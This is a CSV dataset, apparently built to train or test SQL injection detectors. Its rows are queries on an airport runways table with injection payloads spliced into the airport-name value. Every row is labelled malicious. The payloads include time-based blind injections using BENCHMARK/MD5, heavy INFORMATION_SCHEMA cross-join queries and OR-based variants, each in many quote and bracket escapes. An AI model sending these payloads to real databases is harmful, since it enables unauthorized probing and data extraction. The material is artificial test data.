full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" WHERE 6134=6134 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'||(SELECT 0x4a63764c WHERE 1395=1395 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'||(SELECT 0x53476e77 FROM DUAL WHERE 5737=5737 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'+(SELECT 0x47486f42 WHERE 3594=3594 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport||(SELECT 0x61664354 FROM DUAL WHERE 5783=5783 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport||(SELECT 0x654b4d7a WHERE 5973=5973 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport+(SELECT 0x6a715144 WHERE 1491=1491 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) AS AMrz WHERE 7076=7076 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"")) AS PxjO WHERE 8011=8011 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') AS Vdxd WHERE 3753=3753 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") AS iJps WHERE 5123=5123 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' IN BOOLEAN MODE) AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport))) AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) WHERE 2547=2547 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport WHERE 9364=9364 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport+(SELECT urNp WHERE 3279=3279 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) AS zGZF WHERE 4476=4476 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) AS qtas WHERE 7825=7825 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport` WHERE 3014=3014 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport`) WHERE 1005=1005 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'))) AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport%' AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"")) AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport""))) AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') WHERE 7509=7509 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") WHERE 5036=5036 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' WHERE 3044=3044 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" WHERE 2540=2540 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'||(SELECT 0x464c4b5a WHERE 3913=3913 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'||(SELECT 0x6d616c57 FROM DUAL WHERE 2171=2171 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'+(SELECT 0x624e4463 WHERE 4358=4358 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport||(SELECT 0x6c466772 FROM DUAL WHERE 6645=6645 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport||(SELECT 0x4a634d55 WHERE 1498=1498 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport+(SELECT 0x55685750 WHERE 1736=1736 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) AS HSRa WHERE 8049=8049 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"")) AS VYfH WHERE 1331=1331 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') AS mVss WHERE 1793=1793 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") AS eoad WHERE 9809=9809 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport))) AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) WHERE 3501=3501 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport WHERE 6739=6739 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport+(SELECT bKWX WHERE 5397=5397 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) AS HEvn WHERE 3875=3875 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) AS YjgK WHERE 9198=9198 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport` WHERE 9409=9409 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport`) WHERE 6028=6028 AND 3754=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') OR 1632=BENCHMARK(5000000,MD5(0x546f646f))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' OR 1632=BENCHMARK(5000000,MD5(0x546f646f))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" OR 1632=BENCHMARK(5000000,MD5(0x546f646f))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) OR 1632=BENCHMARK(5000000,MD5(0x546f646f))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'))) OR 1632=BENCHMARK(5000000,MD5(0x546f646f))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport%' OR 1632=BENCHMARK(5000000,MD5(0x546f646f))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") OR 1632=BENCHMARK(5000000,MD5(0x546f646f))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"")) OR 1632=BENCHMARK(5000000,MD5(0x546f646f))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport""))) OR 1632=BENCHMARK(5000000,MD5(0x546f646f))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') WHERE 9141=9141 OR 1632=BENCHMARK(5000000,MD5(0x546f646f))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") WHERE 5478=5478 OR 1632=BENCHMARK(5000000,MD5(0x546f646f))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' WHERE 9965=9965 OR 1632=BENCHMARK(5000000,MD5(0x546f646f))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" WHERE 6505=6505 OR 1632=BENCHMARK(5000000,MD5(0x546f646f))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'||(SELECT 0x67574155 WHERE 5634=5634 OR 1632=BENCHMARK(5000000,MD5(0x546f646f))#"");",1,airport-S12,Unknown,Unknown
